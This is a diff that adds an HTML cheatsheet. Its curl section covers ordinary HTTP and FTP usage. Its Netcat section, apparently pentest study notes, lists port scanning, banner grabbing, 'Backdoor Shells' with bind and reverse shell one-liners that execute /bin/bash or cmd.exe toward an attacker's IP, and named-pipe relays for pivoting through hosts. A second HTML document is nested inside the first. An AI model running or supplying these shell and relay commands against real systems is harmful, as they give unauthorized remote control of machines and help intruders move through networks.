@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Curl</title>
+</head>
+<body>
+
+<h1>Cheatsheet</h1>
+
+<p style="text-align: center;"><span style="font-size: 24px;"><strong><u><span style="color: rgb(251, 160, 38);">Curl Commands</span></u></strong></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong><u>Syntax &amp; Examples:</u></strong></span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>curl google.com</strong></span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">-retrieves homepage</span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>curl -O google.com/something.txt</strong></span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">-save output to file</span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>curl -L&nbsp;</strong><strong>google.com</strong></span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">- Follows redirects</span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>curl -A &quot;Mozilla/5.0 etc &quot;&nbsp;</strong><strong>https://google.com</strong></span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">-Changes the User-Agent</span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><strong>curl -X GET&nbsp;</strong><strong>https://www.google.com</strong></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;">-Explicit http method</span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><strong>curl --noproxy 127.0.0.1&nbsp;</strong><strong>http://google.com</strong></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;">-No http proxy</span></p>
+<p style="text-align: left;"><strong><span style="color: rgb(0, 0, 0); font-size: 24px;">curl -k -v https://google.com</span></strong></p>
+<p style="text-align: left;"><span style="color: rgb(0, 0, 0); font-size: 24px;">- Get response with a header</span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><strong>curl -I https://www.google.com</strong></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;">- Head request</span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><strong>curl -d &quot;name=username&amp;password=abc&quot; https://www.google.com</strong></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;">-Post request</span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><strong>curl -u $username:$password http://google.com</strong></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;">- with credentials</span></p>
+<p style="text-align: left;"><br></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong><u>Using Curl for FTP:</u></strong></span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>curl -u FTP_Username:FTP_PW&nbsp;</strong><strong>ftp://google.com</strong></span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">-Access to FTP</span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>curl -u FTP_Username:FT</strong><strong>P_PW&nbsp;</strong><strong>ftp://google.com/file.zip</strong></span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">-Download a file from FTP</span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>curl -T&nbsp;</strong> <strong>&nbsp; -u FTP_UN:FTP_PW&nbsp;</strong><strong>ftp://ftp.google.com</strong>&nbsp;</span></span></p>
+<p style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">&nbsp;- Upload a file to the ftp server&nbsp;</span></span></p>
+<p style="text-align: left;"><br></p>
+<br>
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title></title>
+</head>
+
+<body>
+    <p style="text-align: center;"><span style="font-size: 24px;"><strong><u><span style="color: rgb(65, 168, 95);">Netcat</span></u></strong></span></p>
+    <p style="text-align: left;"><span style="font-size: 24px;"><strong><span style="color: rgb(226, 80, 65);">Basics:</span></strong></span></p>
+    <ul>
+        <li style="text-align: left;"><span style="font-size: 24px;">nc &nbsp; &lt;target IP&gt; &nbsp;&lt;port&gt;</span></li>
+        <li style="text-align: left;"><span style="font-size: 24px;">listener: nc -l -p &nbsp;&lt;port&gt;</span></li>
+        <li style="text-align: left;"><span style="font-size: 24px;">listener: nc -lvnp &lt;port&gt;</span></li>
+    </ul>
+    <p><span style="font-size: 24px;"><strong><span style="color: rgb(250, 197, 28);">File transfer:</span></strong></span></p>
+    <ul>
+        <li><span style="font-size: 24px;">Client to listener: nc -l -p (port) &nbsp;&gt; &nbsp; (output file name)</span></li>
+        <li><span style="font-size: 24px;">Pull from listener to client: nc -l -p (port) &nbsp;&lt; &nbsp;(file name to pull)</span></li>
+    </ul>
+    <p><span style="font-size: 24px;"><strong><span style="color: rgb(61, 142, 185);">Banner Grab:</span></strong></span></p>
+    <ul>
+        <li><span style="font-size: 24px;">echo &quot;&quot; | nc -v -n -w1 &nbsp;&lt;targetIP&gt; &nbsp;&lt;startport&gt; &nbsp;- &nbsp;&lt;end port&gt;</span></li>
+    </ul>
+    <p><span style="font-size: 24px;"><strong><span style="color: rgb(85, 57, 130);">Port Scanner:</span></strong></span></p>
+    <ul>
+        <li><span style="font-size: 24px;">nc -v -n -z -w1 &nbsp;&lt;targetIP&gt; &nbsp;&lt;startport&gt; &nbsp;- &nbsp;&lt;endport&gt;</span></li>
+    </ul>
+    <p><span style="font-size: 24px;"><strong><span style="color: rgb(97, 189, 109);">Backdoor Shells:</span></strong></span></p>
+    <ul>
+        <li><span style="font-size: 24px;">Listening shell on Linux: nc -l -p &nbsp;&lt;port&gt; -e &nbsp;/bin/bash</span></li>
+        <li><span style="font-size: 24px;">Listening shell on Windows: nc -l -p &nbsp;&lt;port&gt; &nbsp;-e &nbsp;cmd.exe</span></li>
+        <li><span style="font-size: 24px;">Reverse shell on Linux: nc &nbsp;&lt;your IP&gt; &lt;port&gt; &nbsp;-e &nbsp;/bin/bash</span></li>
+        <li><span style="font-size: 24px;">Reverse shell on Windows: nc &lt;your IP&gt; &nbsp;&lt;port&gt; &nbsp;-e &nbsp;cmd.exe</span></li>
+    </ul>
+    <p><span style="font-size: 24px;"><strong><span style="color: rgb(184, 49, 47);">Options:</span></strong></span></p>
+    <p><span style="font-size: 24px;">-l &nbsp;= listen</span></p>
+    <p><span style="font-size: 24px;">-u = udp</span></p>
+    <p><span style="font-size: 24px;">-p = port</span></p>
+    <p><span style="font-size: 24px;">-e = execute</span></p>
+    <p><span style="font-size: 24px;">-n = no dns lookup</span></p>
+    <p><span style="font-size: 24px;">-z = packet without data is sent</span></p>
+    <p><span style="font-size: 24px;">-v = verbose</span></p>
+    <p><strong><br></strong></p>
+    <p><span style="font-size: 24px;"><strong>Relays:</strong></span></p>
+    <p><span style="font-size: 24px;"><strong><span style="color: rgb(243, 121, 52);">Linux systems</span></strong></span></p>
+    <p><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">start by creating a FIFO (named pipe) called mypipe</span></span></p>
+    <ul>
+        <li style="text-align: left;"><span style="color: rgb(0, 0, 0);"><span style="font-size: 24px;">cd /tmp</span></span></li>
+        <li style="text-align: left;"><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">mknod mypipe p</span></span></li>
+    </ul>
+    <p><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>Listener to client relay:</strong></span></span></p>
+    <p><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">nc -l -p&lt;port&gt; 0&lt;mypipe | nc &lt;targetIP&gt; &lt;port&gt; | tee mypipe</span></span></p>
+    <p><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>Listener to listener relay:</strong></span></span></p>
+    <p><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">nc -l -p &lt;localport&gt; 0&lt;mypipe | nc -l -p &lt;localport2&gt; | tee mypipe</span></span></p>
+    <p><span style="font-size: 24px;"><strong>Client to client relay:</strong></span></p>
+    <p><span style="font-size: 24px;">nc &lt;previousHOP-ip&gt; &lt;port&gt; 0&lt;mypipe | nc &lt;nexHOP-ip&gt; &lt;port2&gt; | tee mypipe</span></p>
+    <p><span style="font-size: 24px;"><strong><span style="color: rgb(44, 130, 201);">Windows systems</span></strong></span></p>
+    <p>enter a temp directory, from where we create .exe files</p>
+    <ul>
+        <li style="text-align: left;"><span style="color: rgb(0, 0, 0);"><span style="font-size: 24px;">cd c:\tmp</span></span></li>
+    </ul>
+    <p><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>Listener to client relay:</strong></span></span></p>
+    <ul>
+        <li><span style="font-size: 24px;">echo nc &lt;targetIP&gt; &lt;port&gt; &nbsp; &gt; &nbsp;abc.exe</span></li>
+        <li><span style="font-size: 24px;">nc -l -p &lt;port&gt; -e abc.exe</span></li>
+    </ul>
+    <p><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>Listener to listener relay:</strong></span></span></p>
+    <ul>
+        <li><span style="font-size: 24px;">echo nc -l -p &lt;port2&gt; &nbsp; &gt; &nbsp;abc.exe</span></li>
+        <li><span style="font-size: 24px;">nc -l -p &lt;port1&gt; -e abc.exe</span></li>
+    </ul>
+    <p><span style="font-size: 24px;"><strong>Client to client relay:</strong></span></p>
+    <ul>
+        <li><span style="font-size: 24px;">echo nc &lt;nextHOP-ip&gt; &lt;port2&gt; &nbsp; &gt; &nbsp;abc.exe</span></li>
+        <li><span style="font-size: 24px;">nc &lt;previousHOP-ip&gt; &lt;port&gt; &nbsp;-e abc.exe</span></li>
+    </ul>
+    <p><br></p>
+    <p><br></p>
+</body>
+
+</html>
+</body>
+</html>
